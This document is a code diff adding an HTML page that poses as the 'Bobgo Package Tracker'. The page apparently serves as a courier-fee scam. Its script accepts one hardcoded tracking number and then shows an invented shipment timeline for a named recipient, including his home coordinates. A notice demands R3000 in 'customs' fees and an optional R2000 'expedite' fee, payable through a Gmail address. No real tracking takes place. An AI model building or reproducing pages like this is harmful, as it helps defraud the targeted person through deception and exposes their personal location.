@@ -1,0 +1,457 @@
+`<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bobgo Package Tracker</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+    <!-- Custom CSS -->
+    <style>
+        :root {
+            --primary-color: #4CAF50;
+            --accent-color: #FF9800;
+            --success-color: #28a745;
+            --error-color: #dc3545;
+            --bg-color: #f0f4f8;
+            --text-color: #333;
+            --card-bg: #ffffff;
+            --shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        body {
+            background: var(--bg-color);
+            color: var(--text-color);
+            font-family: 'Poppins', sans-serif;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
+
+        .hero {
+            background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
+            color: white;
+            padding: 80px 0;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.2) 0%, transparent 70%);
+            animation: pulse 10s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.5; }
+            50% { transform: scale(1.2); opacity: 0.3; }
+            100% { transform: scale(1); opacity: 0.5; }
+        }
+
+        .hero svg {
+            width: 100px;
+            height: 100px;
+            fill: white;
+            margin-bottom: 30px;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0); }
+        }
+
+        .tracking-form {
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 40px;
+            background: var(--card-bg);
+            border-radius: 16px;
+            box-shadow: var(--shadow);
+            animation: fadeInUp 1s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(50px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-control {
+            border-radius: 8px;
+            padding: 12px;
+            transition: all 0.3s ease;
+        }
+
+        .form-control:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 0.25rem rgba(76,175,80,0.25);
+            transform: scale(1.02);
+        }
+
+        .btn-primary {
+            background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
+            border: none;
+            padding: 12px;
+            font-weight: 600;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(76,175,80,0.3);
+        }
+
+        #loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .result {
+            display: none;
+            margin-top: 40px;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+
+        .result.show {
+            opacity: 1;
+        }
+
+        .tracking-timeline {
+            position: relative;
+            padding: 0;
+            list-style: none;
+            margin: 20px 0;
+        }
+
+        .tracking-timeline li {
+            position: relative;
+            padding-left: 50px;
+            margin-bottom: 30px;
+            opacity: 0;
+            transform: translateX(-50px);
+            transition: all 0.5s ease;
+        }
+
+        .tracking-timeline li.reveal {
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        .tracking-timeline li::before {
+            content: '';
+            position: absolute;
+            left: 20px;
+            top: 15px;
+            bottom: -30px;
+            width: 2px;
+            background: linear-gradient(to bottom, var(--success-color), var(--accent-color));
+            animation: lineGrow 1s ease-in-out forwards;
+        }
+
+        @keyframes lineGrow {
+            0% { height: 0; }
+            100% { height: 100%; }
+        }
+
+        .tracking-timeline li:last-child::before {
+            display: none;
+        }
+
+        .tracking-timeline .icon {
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: var(--success-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 10px rgba(40,167,69,0.3);
+            animation: iconPulse 1.5s infinite, scaleIn 0.5s ease-out;
+        }
+
+        @keyframes scaleIn {
+            0% { transform: scale(0); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes iconPulse {
+            0% { box-shadow: 0 0 0 0 rgba(40,167,69,0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(40,167,69,0); }
+            100% { box-shadow: 0 0 0 0 rgba(40,167,69,0); }
+        }
+
+        .tracking-timeline .icon svg {
+            width: 20px;
+            height: 20px;
+            fill: white;
+        }
+
+        .tracking-timeline .future .icon {
+            background: #6c757d;
+        }
+
+        .progress-bar-container {
+            margin: 20px 0;
+        }
+
+        .progress {
+            height: 10px;
+            background: #dee2e6;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
+            transition: width 1s ease-in-out;
+        }
+
+        .payment-notice {
+            background-color: #fff3cd;
+            border: 1px solid #ffeeba;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            color: #856404;
+            animation: fadeInNotice 0.8s ease-in;
+        }
+
+        @keyframes fadeInNotice {
+            0% { opacity: 0; transform: translateY(20px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        .footer {
+            background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
+            color: white;
+            padding: 30px 0;
+            text-align: center;
+            margin-top: 60px;
+            position: relative;
+        }
+
+        .footer::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"%3E%3Cpath fill="%23ffffff" fill-opacity="1" d="M0,288L48,272C96,256,192,224,288,197.3C384,171,480,149,576,165.3C672,181,768,235,864,250.7C960,267,1056,245,1152,213.3C1248,181,1344,139,1392,117.3L1440,96L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"%3E%3C/path%3E%3C/svg%3E') no-repeat bottom;
+            background-size: cover;
+            opacity: 0.1;
+        }
+
+        /* Media Queries for Responsiveness */
+        @media (max-width: 768px) {
+            .hero {
+                padding: 60px 0;
+            }
+            .tracking-form {
+                padding: 30px 20px;
+                margin: 30px 15px;
+            }
+        }
+
+        @media (max-width: 576px) {
+            .hero svg {
+                width: 80px;
+                height: 80px;
+            }
+            .tracking-timeline li {
+                padding-left: 40px;
+            }
+            .tracking-timeline .icon {
+                width: 30px;
+                height: 30px;
+            }
+            .tracking-timeline li::before {
+                left: 15px;
+            }
+            .payment-notice {
+                font-size: 0.9rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <section class="hero">
+        <!-- SVG Logo: Stylized package with truck icon -->
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M18 17h-5v-2h-2v2H6v-2H4v4h16v-4h-2v2zm-1-7h-4V8h-2v2H7v2h-2V6h14v4h-2zm3-8H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H4V4h16v12z"/>
+        </svg>
+        <h1 class="display-3 fw-bold">Bobgo Package Tracker</h1>
+        <p class="lead">Track your shipments with ease</p>
+    </section>
+
+    <div class="container">
+        <div class="tracking-form">
+            <form id="trackingForm">
+                <div class="mb-4">
+                    <label for="trackingNumber" class="form-label fw-semibold">Enter Your Tracking Number</label>
+                    <input type="text" class="form-control form-control-lg" id="trackingNumber" placeholder="e.g, **********" required aria-describedby="trackingHelp">
+                    <div id="trackingHelp" class="form-text">Provide the unique tracking code from your shipment confirmation.</div>
+                </div>
+                <button type="submit" class="btn btn-primary btn-lg w-100">Track Package</button>
+            </form>
+            <div id="loading" style="display: none;">
+                <div class="spinner mx-auto mt-4"></div>
+                <p class="text-muted mt-2">Processing your request...</p>
+            </div>
+            <div id="error" class="alert alert-danger" role="alert" style="display: none; margin-top: 20px;">
+                <h4 class="alert-heading">Shipment Not Detected</h4>
+                <p>Double-check the tracking number or contact support.</p>
+            </div>
+            <div id="result" class="result card mt-4" style="display: none;">
+                <div class="card-header bg-success text-white">
+                    <h4 class="mb-0">Shipment Located: In Transit</h4>
+                </div>
+                <div class="card-body">
+                    <p class="fw-semibold">Receiver: Frederick Steenkamp</p>
+                    <p class="fw-semibold">Delivery Location: Limpopo, South Africa (23°36'01.7"S 28°02'31.3"E)</p>
+                    <p class="fw-semibold">Estimated Arrival: November 15, 2025 (Standard Delivery)</p>
+                    <div class="progress-bar-container">
+                        <div class="progress">
+                            <div class="progress-bar" role="progressbar" style="width: 0%;" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100"></div>
+                        </div>
+                        <small class="text-muted d-block mt-1">Progress: 60% Complete</small>
+                    </div>
+                    <ul class="tracking-timeline">
+                        <li data-delay="0">
+                            <div class="icon">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                                </svg>
+                            </div>
+                            <strong>Order Processed</strong> - October 15, 2025, 10:00 AM<br>
+                            <span class="text-muted">Johannesburg, Gauteng, South Africa</span>
+                        </li>
+                        <li data-delay="500">
+                            <div class="icon">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                                </svg>
+                            </div>
+                            <strong>Shipped</strong> - October 16, 2025, 2:00 PM<br>
+                            <span class="text-muted">Pretoria, Gauteng, South Africa</span>
+                        </li>
+                        <li data-delay="1000">
+                            <div class="icon">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                                </svg>
+                            </div>
+                            <strong>In Transit</strong> - October 17, 2025, 9:00 AM<br>
+                            <span class="text-muted">Polokwane, Limpopo, South Africa</span>
+                        </li>
+                        <li data-delay="1500" class="future">
+                            <div class="icon">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                                </svg>
+                            </div>
+                            <strong>Customs Clearance</strong> - Expected October 20, 2025<br>
+                            <span class="text-muted">Local Customs Office, Limpopo, South Africa</span>
+                        </li>
+                        <li data-delay="2000" class="future">
+                            <div class="icon">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                                </svg>
+                            </div>
+                            <strong>Out for Delivery</strong> - Expected November 1, 2025<br>
+                            <span class="text-muted">Limpopo, South Africa</span>
+                        </li>
+                        <li data-delay="2500" class="future">
+                            <div class="icon">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                                </svg>
+                            </div>
+                            <strong>Delivered</strong> - Expected November 5, 2025 (with faster delivery option)<br>
+                            <span class="text-muted">Frederick Steenkamp, Limpopo, South Africa</span>
+                        </li>
+                    </ul>
+                    <div class="payment-notice">
+                        <strong>Important Notice:</strong> To proceed with customs clearance and final delivery, Frederick Steenkamp is required to pay R3000 for customs duties and processing fees. For flexibility, payment can be made by November 15, 2025, or the package may be returned to sender at the recipient's expense. Optionally, pay an additional R2000 for faster delivery, expediting arrival to November 5, 2025. Please contact Bobgo support at bobgomanagement@gmail.com to complete the payment and arrange delivery options.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2025 Bobgo. All rights reserved.</p>
+    </footer>
+
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
+    <!-- Custom JavaScript -->
+    <script>
+        const form = document.getElementById('trackingForm');
+        const loading = document.getElementById('loading');
+        const result = document.getElementById('result');
+        const error = document.getElementById('error');
+        const progressBar = document.querySelector('.progress-bar');
+        const correctTrackingNumber = 'XPTRK987654321';
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const trackingNumber = document.getElementById('trackingNumber').value.trim();
+
+            loading.style.display = 'block';
+            result.style.display = 'none';
+            error.style.display = 'none';
+
+            setTimeout(() => {
+                loading.style.display = 'none';
+
+                if (trackingNumber === correctTrackingNumber) {
+                    result.style.display = 'block';
+                    result.classList.add('show');
+                    setTimeout(() => {
+                        progressBar.style.width = '60%';
+                    }, 500);
+                    const items = document.querySelectorAll('.tracking-timeline li');
+                    items.forEach(item => {
+                        setTimeout(() => {
+                            item.classList.add('reveal');
+                        }, parseInt(item.dataset.delay));
+                    });
+                } else {
+                    error.style.display = 'block';
+                }
+            }, 1500); // 1.5 second delay for loading animation
+        });
+    </script>
+</body>
+</html>
+```
